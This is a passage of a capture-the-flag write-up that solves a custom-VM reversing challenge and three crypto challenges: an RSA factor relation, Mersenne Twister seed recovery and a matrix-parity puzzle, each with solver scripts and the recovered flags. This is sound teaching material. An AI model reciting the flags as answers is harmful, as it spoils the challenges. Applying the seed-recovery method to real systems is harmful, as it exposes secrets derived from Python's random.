+    READ &#61; 0x2D
+    OPEN &#61; 0x23
+    EXIT &#61; 0x25
+
+
+class Register&#40;Enum&#41;:
+    R0 &#61; 0xE1
+    R1 &#61; 0xE2
+    R2 &#61; 0xE3
+    R3 &#61; 0xE4
+
+
+class Condition&#40;Enum&#41;:
+    UNCONDITIONAL &#61; 0x0
+    EQUAL &#61; 0x1
+    NOT_EQUAL &#61; 0x2
+    GREATER_THAN &#61; 0x3
+    LESS_THAN &#61; 0x4
+    BOTH_ZERO &#61; 0x5
+
+
+def disassemble&#40;&#41;:
+    raw_program &#61; bytes.fromhex&#40;open&#40;&quot;program.bin&quot;&#41;.read&#40;&#41;&#41;
+    program &#61; list&#40;raw_program&#41;
+
+    while program:
+        print&#40;f&quot;    &#123;hex&#40;len&#40;raw_program&#41; - len&#40;program&#41;&#41;&#125;: &quot;, end&#61;&quot;&quot;&#41;
+        curr &#61; program.pop&#40;0&#41;
+        try:
+            instruction &#61; Instruction&#40;curr&#41;
+        except:
+            continue
+        match instruction:
+            case Instruction.IO:
+                io_type &#61; IOOperation&#40;program.pop&#40;0&#41;&#41;
+                match io_type:
+                    case IOOperation.WRITE:
+                        print&#40;&quot;WRITE R0, &#91;memory:R1&#93;, R2 -&gt; R0&quot;&#41;
+                    case IOOperation.READ:
+                        print&#40;&quot;READ R0, &#91;memory:R1&#93;, R2 -&gt; R0&quot;&#41;
+                    case IOOperation.OPEN:
+                        print&#40;&quot;OPEN &#91;memory:R0&#93; -&gt; R0&quot;&#41;
+                    case IOOperation.EXIT:
+                        print&#40;&quot;EXIT R0&quot;&#41;
+                    case _:
+                        print&#40;&quot;Unhandled io type&quot;, io_type&#41;
+            case &#40;
+                Instruction.AND
+                | Instruction.OR
+                | Instruction.SUB
+                | Instruction.CMP
+                | Instruction.NOR
+                | Instruction.NAND
+                | Instruction.ADD
+                | Instruction.LSHIFT
+                | Instruction.MUL
+                | Instruction.RSHIFT
+                | Instruction.JUGGLE
+                | Instruction.JUGGLE_R
+                | Instruction.MOV
+            &#41;:
+                arg1 &#61; Register&#40;program.pop&#40;0&#41;&#41;
+                arg2 &#61; Register&#40;program.pop&#40;0&#41;&#41;
+                print&#40;f&quot;&#123;instruction.name&#125; &#123;arg1.name&#125;, &#123;arg2.name&#125; -&gt; &#123;arg1.name&#125;&quot;&#41;
+            case Instruction.LOADIMM:
+                arg1 &#61; Register&#40;program.pop&#40;0&#41;&#41;
+                arg2 &#61; program.pop&#40;0&#41;
+                print&#40;f&quot;LOADIMM &#123;arg1.name&#125;, &#123;hex&#40;arg2&#41;&#125; &#40;&#123;arg2.to_bytes&#40;&#41;&#125;&#41;&quot;&#41;
+            case Instruction.LOAD | Instruction.STORE:
+                arg1 &#61; Register&#40;program.pop&#40;0&#41;&#41;
+                arg2 &#61; program.pop&#40;0&#41;
+                print&#40;f&quot;&#123;instruction.name&#125; &#123;arg1.name&#125;, &#91;memory:&#123;hex&#40;arg2&#41;&#125;&#93;&quot;&#41;
+            case Instruction.JUMPIF:
+                condition &#61; Condition&#40;program.pop&#40;0&#41;&#41;
+                target &#61; Register&#40;program.pop&#40;0&#41;&#41;
+                print&#40;f&quot;JUMPIF &#123;condition.name&#125;, &#123;target.name&#125;&quot;&#41;
+            case Instruction.NOP:
+                print&#40;&quot;NOP&quot;&#41;
+            case Instruction.NEG:
+                arg1 &#61; Register&#40;program.pop&#40;0&#41;&#41;
+                print&#40;f&quot;NEG &#123;arg1.name&#125; -&gt; &#123;arg1.name&#125;&quot;&#41;
+            case _:
+                print&#40;f&quot;Unhandled instruction&quot;, instruction&#41;</code></pre>
+<p>Looking at the disassembled code, we see that it begins by storing the string &quot;Enter flag:&quot; to  main memory before calling <code>write&#40;&#41;</code> to print it to the console.</p>
+<pre><code class=language-julia >init:
+    # Print &quot;Enter flag: &quot; to stdout
+    0x0: LOADIMM R0, 0x45 &#40;b&#39;E&#39;&#41;
+    0x3: STORE R0, &#91;memory:0x20&#93;
+    0x6: LOADIMM R0, 0x6e &#40;b&#39;n&#39;&#41;
+    0x9: STORE R0, &#91;memory:0x21&#93;
+    0xc: LOADIMM R0, 0x74 &#40;b&#39;t&#39;&#41;
+    0xf: STORE R0, &#91;memory:0x22&#93;
+    0x12: LOADIMM R0, 0x65 &#40;b&#39;e&#39;&#41;
+    0x15: STORE R0, &#91;memory:0x23&#93;
+    0x18: LOADIMM R0, 0x72 &#40;b&#39;r&#39;&#41;
+    0x1b: STORE R0, &#91;memory:0x24&#93;
+    0x1e: LOADIMM R0, 0x20 &#40;b&#39; &#39;&#41;
+    0x21: STORE R0, &#91;memory:0x25&#93;
+    0x24: LOADIMM R0, 0x66 &#40;b&#39;f&#39;&#41;
+    0x27: STORE R0, &#91;memory:0x26&#93;
+    0x2a: LOADIMM R0, 0x6c &#40;b&#39;l&#39;&#41;
+    0x2d: STORE R0, &#91;memory:0x27&#93;
+    0x30: LOADIMM R0, 0x61 &#40;b&#39;a&#39;&#41;
+    0x33: STORE R0, &#91;memory:0x28&#93;
+    0x36: LOADIMM R0, 0x67 &#40;b&#39;g&#39;&#41;
+    0x39: STORE R0, &#91;memory:0x29&#93;
+    0x3c: LOADIMM R0, 0x3a &#40;b&#39;:&#39;&#41;
+    0x3f: STORE R0, &#91;memory:0x2a&#93;
+    0x42: LOADIMM R0, 0x20 &#40;b&#39; &#39;&#41;
+    0x45: STORE R0, &#91;memory:0x2b&#93;
+    0x48: LOADIMM R0, 0x1 &#40;b&#39;\x01&#39;&#41;
+    0x4b: LOADIMM R1, 0x20 &#40;b&#39; &#39;&#41;
+    0x4e: LOADIMM R2, 0xc &#40;b&#39;\x0c&#39;&#41;
+    0x51: WRITE R0, &#91;memory:R1&#93;, R2 -&gt; R0
+    0x53: LOADIMM R0, 0x69 &#40;read_input&#41;
+    0x56: JUMPIF UNCONDITIONAL, R0</code></pre>
+<p>The program then reads <code>0x23</code> bytes from <code>stdin</code> into an array at offset <code>0xbf</code></p>
+<pre><code class=language-julia >read_input:
+    # Read 0x23 bytes from stdin into an array at 0xbf
+    0x69: LOADIMM R0, 0x0 &#40;b&#39;\x00&#39;&#41;
+    0x6c: LOADIMM R1, 0xbf &#40;b&#39;\xbf&#39;&#41;
+    0x6f: LOADIMM R2, 0x23 &#40;b&#39;#&#39;&#41;
+    0x72: READ R0, &#91;memory:R1&#93;, R2 -&gt; R0</code></pre>
+<p>It then stores the strings &quot;correct&quot; and &quot;wrong&quot; to main memory, before beginning to mutate the input data using a sequence of bit operations.</p>
+<pre><code class=language-julia >store_result_strs:
+    # Store &quot;Correct&quot; at 0x10
+    0x74: LOADIMM R0, 0x43 &#40;b&#39;C&#39;&#41;
+    0x77: STORE R0, &#91;memory:0x10&#93;
+    0x7a: LOADIMM R0, 0x6f &#40;b&#39;o&#39;&#41;
+    0x7d: STORE R0, &#91;memory:0x11&#93;
+    0x80: LOADIMM R0, 0x72 &#40;b&#39;r&#39;&#41;
+    0x83: STORE R0, &#91;memory:0x12&#93;
+    0x86: LOADIMM R0, 0x72 &#40;b&#39;r&#39;&#41;
+    0x89: STORE R0, &#91;memory:0x13&#93;
+    0x8c: LOADIMM R0, 0x65 &#40;b&#39;e&#39;&#41;
+    0x8f: STORE R0, &#91;memory:0x14&#93;
+    0x92: LOADIMM R0, 0x63 &#40;b&#39;c&#39;&#41;
+    0x95: STORE R0, &#91;memory:0x15&#93;
+    0x98: LOADIMM R0, 0x74 &#40;b&#39;t&#39;&#41;
+    0x9b: STORE R0, &#91;memory:0x16&#93;
+    0x9e: LOADIMM R0, 0xa &#40;b&#39;\n&#39;&#41;
+    0xa1: STORE R0, &#91;memory:0x17&#93;
+    # Store &quot;wrong&quot; at 0x0
+    0xa4: LOADIMM R0, 0x57 &#40;b&#39;W&#39;&#41;
+    0xa7: STORE R0, &#91;memory:0x0&#93;
+    0xaa: LOADIMM R0, 0x72 &#40;b&#39;r&#39;&#41;
+    0xad: STORE R0, &#91;memory:0x1&#93;
+    0xb0: LOADIMM R0, 0x6f &#40;b&#39;o&#39;&#41;
+    0xb3: STORE R0, &#91;memory:0x2&#93;
+    0xb6: LOADIMM R0, 0x6e &#40;b&#39;n&#39;&#41;
+    0xb9: STORE R0, &#91;memory:0x3&#93;
+    0xbc: LOADIMM R0, 0x67 &#40;b&#39;g&#39;&#41;
+    0xbf: STORE R0, &#91;memory:0x4&#93;
+    0xc2: LOADIMM R0, 0xa &#40;b&#39;\n&#39;&#41;
+    0xc5: STORE R0, &#91;memory:0x5&#93;</code></pre>
+<p>These operations repeat for each character of the flag, only changing slightly by incrementing a mask value. </p>
+<pre><code class=language-julia >bit_ops:
+    # From here, we do a series of bit operations to each character of the flag
+    0xc8: LOAD R0, &#91;memory:0xbf&#93;
+    0xcb: LOADIMM R1, 0x1 &#40;b&#39;\x01&#39;&#41;
+    0xce: JUGGLE_R R0, R1 -&gt; R0
+    0xd1: STORE R0, &#91;memory:0xbf&#93;
+    0xd4: LOAD R0, &#91;memory:0xbf&#93;
+    0xd7: LOADIMM R1, 0x3f &#40;b&#39;?&#39;&#41;
+    0xda: LOAD R2, &#91;memory:0xbf&#93;
+    0xdd: NOR R2, R1 -&gt; R2
+    0xe0: NOR R0, R2 -&gt; R0
+    0xe3: NOR R1, R2 -&gt; R1
+    0xe6: NOR R0, R1 -&gt; R0
+    0xe9: NEG R0 -&gt; R0
+    0xeb: STORE R0, &#91;memory:0xbf&#93;
+    0xee: LOAD R0, &#91;memory:0xbf&#93;
+    0xf1: LOADIMM R1, 0x2 &#40;b&#39;\x02&#39;&#41;
+    0xf4: JUGGLE R0, R1 -&gt; R0
+    0xf7: STORE R0, &#91;memory:0xbf&#93;
+    0xfa: LOAD R0, &#91;memory:0xbf&#93;
+    0xfd: LOADIMM R1, 0xa7 &#40;b&#39;\xa7&#39;&#41;
+    0x100: LOAD R2, &#91;memory:0xbf&#93;
+    0x103: NOR R2, R1 -&gt; R2
+    0x106: NOR R0, R2 -&gt; R0
+    0x109: NOR R1, R2 -&gt; R1
+    0x10c: NOR R0, R1 -&gt; R0
+    0x10f: NEG R0 -&gt; R0
+    0x111: STORE R0, &#91;memory:0xbf&#93;
+    # End of iteration. These repeat for each character of the input
+    ...</code></pre>
+<p>Finally the result of the mutation is checked against a checkstring, with the program printing &quot;wrong&quot; and exiting immediately if a comparison does not match.</p>
+<pre><code class=language-julia >check:
+    # Check mutated data against a test string
+    0xb2c: LOADIMM R0, 0x5f &#40;b&#39;_&#39;&#41;
+    0xb2f: LOAD R1, &#91;memory:0xbf&#93;
+    0xb32: LOADIMM R2, 0x59 &#40;wrong&#41;
+    0xb35: CMP R0, R1 -&gt; R0
+    0xb38: JUMPIF NOT_EQUAL, R2
+    0xb3b: LOADIMM R0, 0xc &#40;b&#39;\x0c&#39;&#41;
+    0xb3e: LOAD R1, &#91;memory:0xc0&#93;
+    0xb41: LOADIMM R2, 0x59 &#40;wrong&#41;
+    0xb44: CMP R0, R1 -&gt; R0
+    0xb47: JUMPIF NOT_EQUAL, R2
+    0xb4a: LOADIMM R0, 0xc3 &#40;b&#39;\xc3&#39;&#41;
+    0xb4d: LOAD R1, &#91;memory:0xc1&#93;
+    0xb50: LOADIMM R2, 0x59 &#40;wrong&#41;
+    0xb53: CMP R0, R1 -&gt; R0
+    0xb56: JUMPIF NOT_EQUAL, R2
+    ...</code></pre>
+<p>To reverse these bit operations and find the correct flag, we can simulate the instructions and then solve for the original input using a constraint solving library such as <code>claripy</code>.</p>
+<pre><code class=language-python >#&#33;/usr/bin/env python3
+import claripy
+import string
+from tqdm import tqdm
+
+def juggle_r&#40;op, arg&#41;:
+    return &#40;op &gt;&gt; &#40;&#40;8 - &#40;arg &amp; 7&#41;&#41; &amp; 0x1F&#41;&#41; | &#40;op &lt;&lt; &#40;arg &amp; 7&#41;&#41;
+
+def juggle&#40;op, arg&#41;:
+    return &#40;op &lt;&lt; &#40;&#40;8 - &#40;arg &amp; 7&#41;&#41; &amp; 0x1F&#41;&#41; | &#40;op &gt;&gt; &#40;arg &amp; 7&#41;&#41;
+
+def nor&#40;arg1, arg2&#41;:
+    return ~&#40;arg1 | arg2&#41;
+
+def neg&#40;arg&#41;:
+    return ~arg &#43; &#40;arg &#61;&#61; -1&#41;
+
+def solve&#40;&#41;:
+    flag &#61; &#91;claripy.BVS&#40;f&quot;flag_&#123;i&#125;&quot;, 32&#41; for i in range&#40;0x22&#41;&#93;
+    check &#61; b&quot;_\x0c\xc3\x88\xc6\x8a\xe4\x06\xd1:y\x8f\xd1\x08\\\x12\xfc\x97t\x17\xf5\xb3\xde\x84\xd9\xcc\xad\xcd\xba\xe9&#37;I\x80n&quot;
+    solution &#61; &quot;&quot;
+    for i, r0 in tqdm&#40;enumerate&#40;flag&#41;&#41;:
+        r0 &#61; juggle_r&#40;r0, 1&#41;
+        r1 &#61; 0x3F &#43; i
+        r2 &#61; r0
+        r2 &#61; nor&#40;r2, r1&#41;
+        r0 &#61; nor&#40;r0, r2&#41;
+        r1 &#61; nor&#40;r1, r2&#41;
+        r0 &#61; nor&#40;r0, r1&#41;
+        r0 &#61; neg&#40;r0&#41;
+
+        r0 &#61; juggle&#40;r0, 0x2&#41;
+        r1 &#61; 0xA7 &#43; i
+        r2 &#61; r0
+        r2 &#61; nor&#40;r2, r1&#41;
+        r0 &#61; nor&#40;r0, r2&#41;
+        r1 &#61; nor&#40;r1, r2&#41;
+        r0 &#61; nor&#40;r0, r1&#41;
+        r0 &#61; neg&#40;r0&#41;
+
+        s &#61; claripy.Solver&#40;&#41;
+        s.add&#40;r0 &amp; 0xFF &#61;&#61; check&#91;i&#93;&#41;
+        s.add&#40;flag&#91;i&#93; &amp; 0xFF &#61;&#61; flag&#91;i&#93;&#41;
+        if s.satisfiable&#40;&#41;:
+            solution &#43;&#61; &#91;chr&#40;x &amp; 0xFF&#41; for x in s.eval&#40;flag&#91;i&#93;, 20&#41; if chr&#40;x &amp; 0xFF&#41; in string.printable&#93;&#91;0&#93;
+        else:
+            print&#40;&quot;error&quot;&#41;
+    print&#40;solution&#41;
+    # nite&#123;n0r_15_a_un1v3r54l_g4t3_to0&#33;&#125;</code></pre>
+<h2 id=r_stands_alone_crypto ><a href="#r_stands_alone_crypto" class=header-anchor >R Stands Alone &#40;crypto&#41;</a></h2>
+<p>In this challenge, we are given one of three factors \(p, q, r\) of an RSA modulus, and an equation relating the three factors.</p>
+<pre><code class=language-python >from Crypto.Util.number import *
+
+def gen_keys&#40;&#41;:
+    while True:
+        a &#61; getPrime&#40;128&#41;
+        b &#61; getPrime&#40;128&#41;
+        A &#61; a&#43;b
+        B &#61; a-b 
+        
+        p &#61; &#40;&#40;17*A*A*A&#41; - &#40;15*B*B*B&#41; - &#40;45*A*A*B&#41; &#43; &#40;51*A*B*B&#41;&#41; // 8
+
+        if isPrime&#40;p&#41; :
+            return a, b, p
+    
+p, q, r &#61; gen_keys&#40;&#41;
+e &#61; 65537
+n &#61; p*q*r
+
+flag &#61; b&quot;nite&#123;REDACTED&#125;&quot;
+
+ct &#61; pow&#40;bytes_to_long&#40;flag&#41;, e, n&#41;
+print&#40;f&quot;&#123;r &#61;&#125;&quot;&#41;
+print&#40;f&quot;&#123;ct &#61;&#125;&quot;&#41;
+
+&quot;&quot;&quot;OUTPUT :
+r &#61; 17089720847522532186100904495372954796086523439343401190123572243129905753474678094845069878902485935983903151003792259885100719816542256646921114782358850654669422154056281086124314106159053995410679203972646861293990837092569959353563829625357193304859110289832087486433404114502776367901058316568043039359702726129176232071380909102959487599545443427656477659826199871583221432635475944633756787715120625352578949312795012083097635951710463898749012187679742033
+ct &#61; 583923134770560329725969597854974954817875793223201855918544947864454662723867635785399659016709076642873878052382188776671557362982072671970362761186980877612369359390225243415378728776179883524295537607691571827283702387054497203051018081864728864347679606523298343320899830775463739426749812898275755128789910670953110189932506526059469355433776101712047677552367319451519452937737920833262802366767252338882535122186363375773646527797807010023406069837153015954208184298026280412545487298238972141277859462877659870292921806358086551087265080944696281740241711972141761164084554737925380675988550525333416462830465453346649622004827486255797343201397171878952840759670675361040051881542149839523371605515944524102331865520667005772313885253113470374005334182380501000
+&quot;&quot;&quot;</code></pre>
+<p>Expanding the relation in <code>gen_keys&#40;&#41;</code> and simplifying, we arrive at the equation</p>
+<div class=nonumber >\[ r = p^3 + 16q^3, \]</div>
+<p>where \(p,q,r\in \mathbb{Z}\). To solve this equation, we observe that \(r\) can be factored using the sum of two cubes identity as</p>
+<div class=nonumber >\[ 
+r = (p + \alpha q)(p^2 - \alpha pq + q^2), 
+\]</div>
+<p>with \(\alpha = \sqrt[3]{16}\). Hence if we can factor \(r\) over the ring \(\mathbb{Z}[\alpha]\), we have a good chance at finding \((p + \alpha q)\) and from there derive \(p\) and \(q\). This approach is a slight variation on the standard CTF technique to solve Diophantine equations of the form </p>
+<div class=nonumber >\[ c = a^2 +
+b^2, \]</div>
+<p>which is to observe that \(c = (a + bi)(a - bi)\) and hence recover \(a\) and \(b\) by factoring \(c\) over the Gaussian integers \(\mathbb{Z}[i]\).</p>
+<p>Below is an implementation in Sagemath</p>
+<pre><code class=language-python >#&#33;/usr/bin/env sage
+from Crypto.Util.number import *
+
+r &#61; 17089720847522532186100904495372954796086523439343401190123572243129905753474678094845069878902485935983903151003792259885100719816542256646921114782358850654669422154056281086124314106159053995410679203972646861293990837092569959353563829625357193304859110289832087486433404114502776367901058316568043039359702726129176232071380909102959487599545443427656477659826199871583221432635475944633756787715120625352578949312795012083097635951710463898749012187679742033
+ct &#61; 583923134770560329725969597854974954817875793223201855918544947864454662723867635785399659016709076642873878052382188776671557362982072671970362761186980877612369359390225243415378728776179883524295537607691571827283702387054497203051018081864728864347679606523298343320899830775463739426749812898275755128789910670953110189932506526059469355433776101712047677552367319451519452937737920833262802366767252338882535122186363375773646527797807010023406069837153015954208184298026280412545487298238972141277859462877659870292921806358086551087265080944696281740241711972141761164084554737925380675988550525333416462830465453346649622004827486255797343201397171878952840759670675361040051881542149839523371605515944524102331865520667005772313885253113470374005334182380501000
+
+K.&lt;a&gt; &#61; NumberField&#40;x^3 - 16, &quot;a&quot;&#41;
+O &#61; K.order&#40;a&#41;
+factors &#61; O&#40;r&#41;.factor&#40;&#41;
+for b, e in factors:
+    f &#61; &#40;b**e&#41;.polynomial&#40;&#41;
+    if f.degree&#40;&#41; &gt; 1:
+        continue
+    p &#61; f.constant_coefficient&#40;&#41;
+    q &#61; f.leading_coefficient&#40;&#41;
+    assert p**3 &#43; 16 * q**3 &#61;&#61; r
+    n &#61; p * q * r
+    phi &#61; &#40;p - 1&#41; * &#40;q - 1&#41; * &#40;r - 1&#41;
+    e &#61; 65537
+    d &#61; inverse_mod&#40;e, phi&#41;
+    m &#61; pow&#40;ct, d, n&#41;
+    print&#40;long_to_bytes&#40;m&#41;&#41;
+    # nite&#123;7h3_Latt1c3_kn0ws_Ur_Pr1m3s_very_vvery_v3Ry_w3LLL&#125;</code></pre>
+<h2 id=import_random_crypto ><a href="#import_random_crypto" class=header-anchor >Import Random &#40;crypto&#41;</a></h2>
+<p>This challenge is based upon Stackered&#39;s research on recovering a <a href="https://stackered.com/blog/python-random-prediction/">Mersenne Twister seed with a minimal number of samples</a>.</p>
+<code>chall.py</code>
+<pre><code class=language-python >from rAnDoM import *
+import random
+from Crypto.Util.number import *
+
+flag &#61; b&quot;nite&#123;REDACTED&#125;&quot;
+chunks &#61; &#91;bytes_to_long&#40;flag&#91;i:i&#43;4&#93;&#41; for i in range&#40;0, len&#40;flag&#41;, 4&#41;&#93;
+
+yap &#61; &quot;&quot;
+for i in chunks:
+    rAnDoM.sEeD&#40;i&#41;
+    yap &#43;&#61; hex&#40;rAnDoM.gEtRanDBitS&#40;32&#41;&#41;
+    yap &#43;&#61; hex&#40;rAnDoM.gEtRanDBitS&#40;32&#41;&#41;
+    yap &#43;&#61; hex&#40;rAnDoM.gEtRanDBitS&#40;32&#41;&#41;
+    yap &#43;&#61; hex&#40;rAnDoM.gEtRanDBitS&#40;32&#41;&#41;
+    yap &#43;&#61; hex&#40;rAnDoM.gEtRanDBitS&#40;32&#41;&#41;
+    yap &#43;&#61; hex&#40;rAnDoM.gEtRanDBitS&#40;32&#41;&#41;
+
+print&#40;&quot;WHAT IS BRO YAPPING ?&#33;&#33;&quot;&#41;
+print&#40;f&quot;\nbro :\n&#123;yap&#125;&quot;&#41;
+print&#40;&quot;\nBRO WHAT ??&#33;?&#33;&quot;&#41;</code></pre>
+<code>random.py</code>
+<pre><code class=language-python >import math
+import random
+from Crypto.Util.number import *
+
+class rAnDoM:
+    current_seed &#61; 0
+    indexes &#61; &#91;0,1,2,227,228,229&#93;
+    index &#61; 0
+    def __init__&#40;cls&#41; -&gt; None:
+        print&#40;&#39;YESSIr&#39;&#41;
+        pass
+
+    @classmethod
+    def sEeD&#40;cls, seed&#41; -&gt; None:
+        if not isinstance&#40;seed, &#40;type&#40;None&#41;, int, float, str, bytes, bytearray&#41;&#41;:
+            raise TypeError&#40;&#39;The only supported seed types are: None,\n&#39;
+                            &#39;int, float, str, bytes, and bytearray.&#39;&#41;
+        cls.current_seed &#61; seed
+        random.seed&#40;seed&#41;
+    
+    @classmethod
+    def gEtRanDBitS&#40;cls, bits : int&#41; -&gt; int:
+        cls.sEeD&#40;cls.current_seed&#41;
+        num &#61; &#91;random.getrandbits&#40;32&#41; for _ in range&#40;624&#41;&#93;&#91;cls.indexes&#91;cls.index &#37; len&#40;cls.indexes&#41;&#93;&#93;
+        cls.index &#43;&#61; 1
+        return int&#40;bin&#40;num**&#40;bits // 32&#41;&#41;&#91;2:bits&#43;2&#93;, 2&#41;</code></pre>
+<p>The crux of the research is in mapping out the invertible dependencies within Python&#39;s Mersenne twister implementation. Let \(K_j\) denote words of the seed key, \(J_i\) denote words of the intermediate key, \(I_i\) denote the words of the initial seed state, and \(S_i\) denote words of the successor PRNG state. Our goal is to recover the seed key \(K_j\) given a small set of outputs from the PRNG. The main relations described by Stackered are as follows:</p>
+<ol>
+<li><p>The PRNG outputs values of the form \(T(S_i)\) where \(T\) is an invertible tempering function. </p>
+
+<li><p>Given pairs of untempered successor states \(S_i, S_{i - 227}\) we can recover the MSB of state \(I_{i-1}\) and the 31-LSBs of state \(I_{i}\).</p>
+
+<li><p>Cascading the above fact twice, we can obtain the full values of three consecutive initial states \(I_{i-2}, I_{i-1}, I_{i}\) up to 1 bit of error.</p>
+
+<li><p>Given three consecutive initial states \(I_{i-2}, I_{i-1}, I_{i}\), we can recover two consecutive words \(J_{i-1}, J_{i}\) of the intermediate key.</p>
+
+<li><p>Given two consecutive words \(J_{i-1}, J_{i}\) of the intermediate key, we can recover a word \(K_j\) of the seed key.</p>
+
+</ol>
+<div class=invert_image ><div class=small_image ><img src="https://stackered.com/img/articles/python-random-prediction/diagram1.svg" alt=ImportRandom  /></div></div>
+<p>Since the challenge conveniently outputs the minimal number of PRNG words for this recovery to occur, we can use the above strategy to repeatedly recover the seed keys, which each form four bytes of the flag.</p>
+<p>Below is an implementation in Python, using the <a href="https://github.com/StackeredSAS/python-random-playground/"><code>python_random_playground</code></a> library which accompanied the above research.</p>
+<pre><code class=language-python >#&#33;/usr/bin/env python3
+
+from python_random_playground.functions import *
+import string
+
+
+def solve&#40;&#41;:
+    output &#61; open&#40;&quot;output.txt&quot;&#41;.read&#40;&#41;
+    out &#61; &#91;int&#40;x, 16&#41; for x in output.split&#40;&quot;0x&quot;&#41; if x&#93;
+
+    flag &#61; b&quot;&quot;
+    for i in range&#40;0, len&#40;out&#41;, 6&#41;:
+        chunk_out &#61; out&#91;i : i &#43; 6&#93;
+        untempered &#61; &#91;untemper&#40;s&#41; for s in chunk_out&#93;
+        I_227_, I_228 &#61; invertStep&#40;untempered&#91;0&#93;, untempered&#91;3&#93;&#41;
+        I_228_, I_229 &#61; invertStep&#40;untempered&#91;1&#93;, untempered&#91;4&#93;&#41;
+        I_229_, I_230 &#61; invertStep&#40;untempered&#91;2&#93;, untempered&#91;5&#93;&#41;
+
+        I_228 &#43;&#61; I_228_
+        I_229 &#43;&#61; I_229_
+
+        seed1 &#61; recover_Kj_from_Ii&#40;I_230, I_229, I_228, 230&#41;
+        seed2 &#61; recover_Kj_from_Ii&#40;I_230 &#43; 0x80000000, I_229, I_228, 230&#41;
+
+        flag1 &#61; int.to_bytes&#40;int&#40;seed1&#41;, 4&#41;
+        flag2 &#61; int.to_bytes&#40;int&#40;seed2&#41;, 4&#41;
+
+        if all&#40;x in string.printable.encode&#40;&#41; for x in flag1&#41;:
+            flag &#43;&#61; flag1
+        else:
+            flag &#43;&#61; flag2
+        print&#40;flag&#41;
+        # nite&#123;br0_y4pp1ng_s33d_sl1pp1ng&#125;</code></pre>
+<h2 id=quadrillion_matrices_crypto ><a href="#quadrillion_matrices_crypto" class=header-anchor >Quadrillion Matrices &#40;crypto&#41;</a></h2>
+<p>In this challenge we are given pairs of \(2\times 2\) matrices satisfying </p>
+<div class=nonumber >\[
+B_i = A_i^{b_i},
+\]</div>
+<p>where \(b_i\) is odd if the \(i\)-th bit of the flag is set, and even otherwise.</p>
+<pre><code class=language-python >from Crypto.Util.number import *
+from secret import gen_matrix
+from sage.all import *
+import random
+
+p &#61; getPrime&#40;256&#41;
+
+with open&#40;&#39;flag&#39;, &#39;rb&#39;&#41; as f:
+    flag &#61; bin&#40;bytes_to_long&#40;f.read&#40;&#41;&#41;&#41;&#91;2:&#93;
+
+inp &#61; &#91;&#93;
+out &#61; &#91;&#93;
+
+for i in flag:
+    M &#61; gen_matrix&#40;p&#41;
+    inp.append&#40;list&#40;M&#41;&#41;
+    out.append&#40; list&#40;&#40;M**&#40;random.randrange&#40;3&#43;int&#40;i&#41;, p, 2&#41;&#41;&#41; * &#40;M**&#40;random.randrange&#40;3, p, 2&#41;&#41;&#41;&#41; &#41;
+
+with open&#40;&#39;out&#39;, &#39;w&#39;&#41; as f:
+    f.write&#40;str&#40;p&#41; &#43; &#39;\n&#39;&#41;
+    f.write&#40;str&#40;inp&#41; &#43; &#39;\n&#39;&#41;
+    f.write&#40;str&#40;out&#41;&#41;</code></pre>
+<p>The matrices \(A_i\) are generated using a hidden process, but a quick verification tells us that each \(A_i\) is diagonalizable over \(\mathbb{F}_p\) and has at least one quadratic non-residue as an eigenvalue.</p>
+<pre><code class=language-python >assert all&#40;inp.is_diagonalizable&#40;&#41; for inp in tqdm&#40;input_matrices&#41;&#41;
+assert all&#40;
+    any&#40;not e.is_square&#40;&#41; for e in inp.eigenvalues&#40;&#41;&#41;
+    for inp in tqdm&#40;input_matrices&#41;
+&#41;</code></pre>
+<p>Let \(P_i\) be a matrix such that \(P_i^{-1}D_iP_i = A_i\) with</p>
+<div class=nonumber >\[
+D = \begin{bmatrix}
+\lambda_{i, 1} & 0 \\
+0 & \lambda_{i, 2}
+\end{bmatrix}.
+\]</div>
+<p>Then \(B_i = A_i^{b_i} = P_i^{-1}D^{b_i}P\) with</p>
+<div class=nonumber >\[
+D^{b_i} = \begin{bmatrix}
+\lambda_{i, 1}^{b_i} & 0 \\
+0 & \lambda_{i, 2}^{b_i}
+\end{bmatrix}.
+\]</div>
+<p>Without loss of generality, assume \(\lambda_{i, 1}\) is a quadratic non-residue. Then since the Legendre symbol is multiplicative, we have</p>
+<div class=nonumber >\[
+\left( \frac{\lambda_{i, 1}^{b_i}}{p} \right) = \left( \frac{\lambda_{i, 1}}{p}\right)^{b_i}
+= \left( -1\right)^{b_i}. 
+\]</div>
+<p>Hence by calculating the Legendre symbol of the diagonal entries in \(P_i^{-1}B_iP\), we can determine the value of \(\left( -1\right)^{b_i}\) and hence the parity of \(b_i\).</p>
+<p>The following is an implementation in Python.</p>
+<pre><code class=language-python >#&#33;/usr/bin/env python3
+from tqdm import tqdm
+from Crypto.Util.number import *
+
+
+def parse_input&#40;&#41;:
+    with open&#40;&quot;out&quot;&#41; as fp:
+        p &#61; int&#40;fp.readline&#40;&#41;&#41;
+        K &#61; GF&#40;p&#41;
+        inp &#61; eval&#40;fp.readline&#40;&#41;&#41;
+        out &#61; eval&#40;fp.readline&#40;&#41;&#41;
+        input_matrices &#61; &#91;matrix&#40;K, i&#41; for i in inp&#93;
+        output_matrices &#61; &#91;matrix&#40;K, i&#41; for i in out&#93;
+
+    return p, input_matrices, output_matrices
+
+
+def solve&#40;&#41;:
+    p, input_matrices, output_matrices &#61; parse_input&#40;&#41;
+
+    assert all&#40;inp.is_diagonalizable&#40;&#41; for inp in tqdm&#40;input_matrices&#41;&#41;
+    assert all&#40;any&#40;not e.is_square&#40;&#41; for e in inp.eigenvalues&#40;&#41;&#41; for inp in tqdm&#40;input_matrices&#41;&#41;
+
+    flag &#61; &quot;&quot;
+    for inp, out in tqdm&#40;zip&#40;input_matrices, output_matrices&#41;&#41;:
+        inpj, P &#61; inp.diagonalization&#40;&#41;  # P^T&#123;-1&#125;&#40;inp&#41;P &#61; inpj
+        outj &#61; P.inverse&#40;&#41; * out * P
+        assert outj.is_diagonal&#40;&#41;
+
+        tests &#61; zip&#40;inpj.diagonal&#40;&#41;, outj.diagonal&#40;&#41;&#41;
+        for x, y in tests:
+            x_legendre &#61; legendre_symbol&#40;x, p&#41;
+            y_legendre &#61; legendre_symbol&#40;y, p&#41;
+            if x_legendre &#61;&#61; -1:
+                if y_legendre &#61;&#61; 1:  # even &#61; &#40;-1&#41;^even
+                    flag &#43;&#61; &quot;0&quot;
+                elif y_legendre &#61;&#61; -1:  # odd
+                    flag &#43;&#61; &quot;1&quot;
+                break
+
+    print&#40;long_to_bytes&#40;int&#40;flag, 2&#41;&#41;&#41;
+    # nite&#123;0ur_b4tt1e_w4s_l0g3ndr3&#125;</code></pre>
+</div>
+        </div> 
+    </div> 
+    
